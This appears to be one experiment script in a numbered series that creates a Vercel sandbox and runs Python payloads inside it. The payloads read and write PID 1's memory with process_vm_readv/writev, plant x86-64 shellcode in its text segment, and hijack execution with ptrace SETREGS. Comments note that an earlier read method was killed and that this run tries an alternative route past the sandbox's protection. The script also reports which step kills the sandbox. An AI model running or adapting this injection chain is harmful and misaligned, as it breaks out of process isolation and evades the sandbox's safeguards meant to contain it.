# 实验J166: process_vm_readv/writev 替代通道 + 完整注入v3 (text段shellcode)
# j165: PEEKTEXT也触发杀(读封死); maps: text 0x400000-0x8db000 r-xp, 堆 0xe9e000 rw-p(NX)
# 方法: cmdA/B process_vm_readv读  cmdC/D process_vm_writev写(堆/text)
#       cmdE 完整注入: writev写shellcode到text段末尾 -> attach+SETREGS rip -> DETACH执行 -> pipe读
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def catfile(sid, path, label, n=4000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "cat", "args": [path], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj166"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
if c != 200:
    print(r[:400])
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

# cmdA/B: process_vm_readv 读 text(0x401000) 与 堆(0xe9e000)
CB = r'''
import ctypes, os
out = open("/tmp/d166b.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
libc = ctypes.CDLL(None, use_errno=True)
libc.syscall.restype = ctypes.c_long
SYS_process_vm_readv = 310
class Iovec(ctypes.Structure):
    _fields_ = [("iov_base", ctypes.c_void_p), ("iov_len", ctypes.c_size_t)]
def pvm(addr, n=16):
    buf = ctypes.create_string_buffer(n)
    local = Iovec(ctypes.cast(buf, ctypes.c_void_p), n)
    remote = Iovec(ctypes.c_void_p(addr), n)
    ctypes.set_errno(0)
    r = libc.syscall(SYS_process_vm_readv, 1, ctypes.byref(local), 1,
                     ctypes.byref(remote), 1, 0)
    if r > 0:
        return r, buf.raw.hex()
    return r, ctypes.get_errno()
p("start")
r, d = pvm(0x401000)
p("read_text", r, d if isinstance(d, str) else "errno %d" % d)
r2, d2 = pvm(0xe9e000)
p("read_heap", r2, d2 if isinstance(d2, str) else "errno %d" % d2)
p("=== DONE")
out.close()
'''

# cmdC/D: process_vm_writev 写 堆(0xe9e000) 与 text(0x008da000)
CD = r'''
import ctypes, os
out = open("/tmp/d166d.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
libc = ctypes.CDLL(None, use_errno=True)
libc.syscall.restype = ctypes.c_long
SYS_process_vm_writev = 311
class Iovec(ctypes.Structure):
    _fields_ = [("iov_base", ctypes.c_void_p), ("iov_len", ctypes.c_size_t)]
def pvw(addr, data):
    n = len(data)
    buf = ctypes.create_string_buffer(data, n)
    local = Iovec(ctypes.cast(buf, ctypes.c_void_p), n)
    remote = Iovec(ctypes.c_void_p(addr), n)
    ctypes.set_errno(0)
    r = libc.syscall(SYS_process_vm_writev, 1, ctypes.byref(local), 1,
                     ctypes.byref(remote), 1, 0)
    return r, ctypes.get_errno()
p("start")
r, e = pvw(0xe9e000, b"\x90" * 8)
p("write_heap", r, "errno", e)
r2, e2 = pvw(0x008da000, b"\x90" * 8)
p("write_text", r2, "errno", e2)
p("=== DONE")
out.close()
'''

# cmdE: 完整注入v3 - writev写shellcode到text段 -> attach+SETREGS -> DETACH执行 -> pipe读
CE = r'''
import ctypes, time, os, struct
out = open("/tmp/d166e.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
libc = ctypes.CDLL(None, use_errno=True)
libc.syscall.restype = ctypes.c_long
libc.ptrace.restype = ctypes.c_long
SYS_process_vm_writev = 311
PTRACE_ATTACH, PTRACE_DETACH = 16, 17
PTRACE_GETREGS, PTRACE_SETREGS = 12, 13
class Iovec(ctypes.Structure):
    _fields_ = [("iov_base", ctypes.c_void_p), ("iov_len", ctypes.c_size_t)]
class UserRegs(ctypes.Structure):
    _fields_ = [("r15", ctypes.c_ulonglong), ("r14", ctypes.c_ulonglong),
                ("r13", ctypes.c_ulonglong), ("r12", ctypes.c_ulonglong),
                ("rbp", ctypes.c_ulonglong), ("rbx", ctypes.c_ulonglong),
                ("r11", ctypes.c_ulonglong), ("r10", ctypes.c_ulonglong),
                ("r9", ctypes.c_ulonglong), ("r8", ctypes.c_ulonglong),
                ("rax", ctypes.c_ulonglong), ("rcx", ctypes.c_ulonglong),
                ("rdx", ctypes.c_ulonglong), ("rsi", ctypes.c_ulonglong),
                ("rdi", ctypes.c_ulonglong), ("orig_rax", ctypes.c_ulonglong),
                ("rip", ctypes.c_ulonglong), ("cs", ctypes.c_ulonglong),
                ("eflags", ctypes.c_ulonglong), ("rsp", ctypes.c_ulonglong),
                ("ss", ctypes.c_ulonglong), ("fs_base", ctypes.c_ulonglong),
                ("gs_base", ctypes.c_ulonglong), ("ds", ctypes.c_ulonglong),
                ("es", ctypes.c_ulonglong), ("fs", ctypes.c_ulonglong),
                ("gs", ctypes.c_ulonglong)]
def pvw(addr, data):
    n = len(data)
    buf = ctypes.create_string_buffer(data, n)
    local = Iovec(ctypes.cast(buf, ctypes.c_void_p), n)
    remote = Iovec(ctypes.c_void_p(addr), n)
    ctypes.set_errno(0)
    r = libc.syscall(SYS_process_vm_writev, 1, ctypes.byref(local), 1,
                     ctypes.byref(remote), 1, 0)
    return r, ctypes.get_errno()
def pt(pid, req, addr=0, data=0):
    ctypes.set_errno(0)
    r = libc.ptrace(req, pid, addr, data)
    return r, ctypes.get_errno()

# 1. pipe dup2 fd100
rfd, wfd = os.pipe()
os.dup2(wfd, 100)
p("pipe", rfd, wfd)

# 2. attach + getregs (拿 orig_rip)
r, e = pt(1, PTRACE_ATTACH)
p("attach", r, "errno", e)
if r != 0:
    p("attach_failed")
    out.close()
    raise SystemExit
time.sleep(0.3)
regs = UserRegs()
pt(1, PTRACE_GETREGS, 0, ctypes.byref(regs))
orig_rip = regs.rip
p("orig_rip", hex(orig_rip))
# detach 先恢复, 用 writev 写 (不需要 attach 状态下写)
pt(1, PTRACE_DETACH)
p("pre_detached")

# 3. shellcode 组装, SC_ADDR = text段最后一页 0x008da000
SC_ADDR = 0x008da000
MSG_ADDR = SC_ADDR + 0x200
sc = b""
sc += b"\x50"                                # push rax
sc += b"\x57"                                # push rdi
sc += b"\x56"                                # push rsi
sc += b"\x52"                                # push rdx
sc += b"\x48\xc7\xc0\x01\x00\x00\x00"        # mov rax, 1
sc += b"\x48\xc7\xc7\x64\x00\x00\x00"        # mov rdi, 100
sc += b"\x48\xc7\xc6" + struct.pack("<I", MSG_ADDR & 0xffffffff)  # mov rsi, MSG
sc += b"\xba\x0c\x00\x00\x00"                # mov rdx, 12
sc += b"\x0f\x05"                            # syscall
sc += b"\x5a"                                # pop rdx
sc += b"\x5e"                                # pop rsi
sc += b"\x5f"                                # pop rdi
sc += b"\x58"                                # pop rax
sc += b"\x50"                                # push rax
sc += b"\x48\xb8" + struct.pack("<Q", orig_rip)  # mov rax, orig_rip
sc += b"\x48\x87\x04\x24"                    # xchg [rsp], rax
sc += b"\xc3"                                # ret
pad = MSG_ADDR - (SC_ADDR + len(sc))
if pad > 0:
    sc += b"\x90" * pad
sc += b"HIJACK_OK!!\x00"
p("sc_len", len(sc), "SC_ADDR", hex(SC_ADDR))

# 4. writev 写入 text 段
r2, e2 = pvw(SC_ADDR, sc)
p("writev_sc", r2, "errno", e2)
if r2 != len(sc):
    p("writev_partial")
    out.close()
    raise SystemExit
time.sleep(0.3)

# 5. attach + SETREGS rip -> SC_ADDR
r3, e3 = pt(1, PTRACE_ATTACH)
p("attach2", r3, "errno", e3)
time.sleep(0.3)
regs2 = UserRegs()
pt(1, PTRACE_GETREGS, 0, ctypes.byref(regs2))
regs2.rip = SC_ADDR
r4, e4 = pt(1, PTRACE_SETREGS, 0, ctypes.byref(regs2))
p("setregs", r4, "errno", e4, "->", hex(SC_ADDR))

# 6. DETACH 恢复执行
pt(1, PTRACE_DETACH)
p("detached_exec")

# 7. 读 pipe
time.sleep(2.5)
os.set_blocking(rfd, False)
data = b""
try:
    while True:
        d = os.read(rfd, 4096)
        if not d:
            break
        data += d
except BlockingIOError:
    pass
p("pipe_data", repr(data))
p("=== DONE")
out.close()
'''

# cmdF: alive 检查
CF = r'''
import os
out = open("/tmp/d166f.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
try:
    p("pid1_exists", os.path.exists("/proc/1"))
    p("cmdline", open("/proc/1/cmdline", "rb").read()[:80])
except Exception as e:
    p("err", repr(e))
p("=== DONE")
out.close()
'''

steps = [
    ("pvm-read", "/tmp/d166b.txt", CB),
    ("pvm-write", "/tmp/d166d.txt", CD),
    ("inject-v3", "/tmp/d166e.txt", CE),
    ("alive", "/tmp/d166f.txt", CF),
]

for label, marker, code in steps:
    st = run_cmd(sid, code, label, timeout=220)
    time.sleep(2)
    cf = catfile(sid, marker, f"marker[{label}]", 4000)
    if st == "DEAD" or cf == 410:
        print(f"\n!!! DEATH after cmd[{label}] -> trigger = {label}", flush=True)
        break

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
